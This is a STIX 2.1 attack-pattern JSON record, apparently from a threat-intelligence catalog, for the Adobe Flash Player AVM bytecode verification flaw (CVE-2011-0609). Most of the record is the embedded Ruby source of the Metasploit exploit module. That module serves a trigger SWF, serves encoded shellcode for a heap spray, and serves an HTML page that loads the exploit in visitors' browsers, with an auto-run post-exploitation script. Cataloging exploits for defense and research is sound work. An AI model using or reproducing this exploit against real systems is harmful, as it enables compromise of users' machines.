{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--58ce803f-a07d-42c9-a7f5-217cd78c3ff0",
    "created": "2024-08-14T16:41:16.633622Z",
    "modified": "2024-08-14T16:41:16.633626Z",
    "name": "Adobe Flash Player AVM Bytecode Verification Vulnerability",
    "description": " This module exploits a vulnerability in Adobe Flash Player versions 10.2.152.33 and earlier. This issue is caused by a failure in the ActionScript3 AVM2 verification logic. This results in unsafe JIT(Just-In-Time) code being executed.  This is the same vulnerability that was used for the RSA attack in March 2011.  Specifically, this issue results in uninitialized memory being referenced and later executed. Taking advantage of this issue relies on heap spraying and controlling the uninitialized memory.  Currently this exploit works for IE6, IE7, and Firefox 3.6 and likely several other browsers. DEP does catch the exploit and causes it to fail. Due to the nature of the uninitialized memory its fairly difficult to get around this restriction.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/adobe_flashplayer_avm.rb",
            "external_id": "adobe_flashplayer_avm.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-0609"
        },
        {
            "source_name": "reference",
            "url": "http://bugix-security.blogspot.com/2011/03/cve-2011-0609-adobe-flash-player.html"
        },
        {
            "source_name": "reference",
            "url": "http://www.adobe.com/devnet/swf.html"
        },
        {
            "source_name": "reference",
            "url": "http://www.adobe.com/support/security/advisories/apsa11-01.html"
        },
        {
            "source_name": "reference",
            "url": "http://www.f-secure.com/weblog/archives/00002226.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Adobe Flash Player AVM Bytecode Verification Vulnerability',\n      'Description'    => %q{\n          This module exploits a vulnerability in Adobe Flash Player versions 10.2.152.33\n        and earlier. This issue is caused by a failure in the ActionScript3 AVM2 verification\n        logic. This results in unsafe JIT(Just-In-Time) code being executed.  This is the same\n        vulnerability that was used for the RSA attack in March 2011.\n\n          Specifically, this issue results in uninitialized memory being referenced and later\n        executed. Taking advantage of this issue relies on heap spraying and controlling the\n        uninitialized memory.\n\n          Currently this exploit works for IE6, IE7, and Firefox 3.6 and likely several\n        other browsers. DEP does catch the exploit and causes it to fail. Due to the nature\n        of the uninitialized memory its fairly difficult to get around this restriction.\n        },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'bannedit', # Metasploit version,\n          'Unknown'   # Malcode version seen used in targeted attacks\n        ],\n      'References'     =>\n        [\n          ['CVE', '2011-0609'],\n          ['OSVDB', '71254'],\n          ['URL', 'http://bugix-security.blogspot.com/2011/03/cve-2011-0609-adobe-flash-player.html'],\n          ['URL', 'http://www.adobe.com/devnet/swf.html'],\n          ['URL', 'http://www.adobe.com/support/security/advisories/apsa11-01.html'],\n          ['URL', 'http://www.f-secure.com/weblog/archives/00002226.html'],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC'          => 'process',\n          'HTTP::compression' => 'gzip',\n          'HTTP::chunked'     => true,\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'\n        },\n      'Payload'        =>\n        {\n          'Space'    => 1000,\n          'BadChars' => \"\\x00\",\n          'DisableNops' => true\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Automatic', {}],\n        ],\n      'DisclosureDate' => '2011-03-15',\n      'DefaultTarget'  => 0))\n  end\n\n  def exploit\n    path = File.join( Msf::Config.data_directory, \"exploits\", \"CVE-2011-0609.swf\" )\n    fd = File.open( path, \"rb\" )\n    @swf = fd.read(fd.stat.size)\n    fd.close\n\n    super\n  end\n\n  def on_request_uri(cli, request)\n    trigger = @swf\n    trigger_file = rand_text_alpha(rand(6)+3) + \".swf\"\n    shellcode = payload.encoded.unpack('H*')[0]\n    obj_id = rand_text_alpha(rand(6)+3)\n\n    if request.uri.match(/\\.swf/i)\n      print_status(\"Sending Exploit SWF\")\n      send_response(cli, trigger, { 'Content-Type' => 'application/x-shockwave-flash' })\n      return\n    end\n\n    # we use a nice trick by having Flash request our shellcode and load it for the heap spray\n    # src for the flash file: external/source/exploits/CVE-2011-0609/exploit.as\n    if request.uri.match(/\\.txt/i)\n      send_response(cli, shellcode, { 'Content-Type' => 'text/plain' })\n      return\n    end\n\n    html =  <<-EOS\n    <html>\n      <head>\n      </head>\n      <body>\n    <center>\n      <object classid=\"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000\"\n                 id=\"#{obj_id}\" width=\"600\" height=\"400\"\n                 codebase=\"http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab\">\n             <param name=\"movie\" value=\"#{get_resource}#{trigger_file}\" />\n             <embed src=\"#{get_resource}#{trigger_file}\" quality=\"high\"\n                 width=\"320\" height=\"300\" name=\"#{obj_id}\" align=\"middle\"\n                 allowNetworking=\"all\"\n                 type=\"application/x-shockwave-flash\"\n                 pluginspage=\"http://www.macromedia.com/go/getflashplayer\">\n             </embed>\n\n         </object>\n    </center>\n\n    </body>\n    </html>\nEOS\n\n    print_status(\"Sending #{self.name} HTML\")\n    send_response(cli, html, { 'Content-Type' => 'text/html' })\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-03-15",
    "x_mitre_platforms": [
        "win'"
    ]
}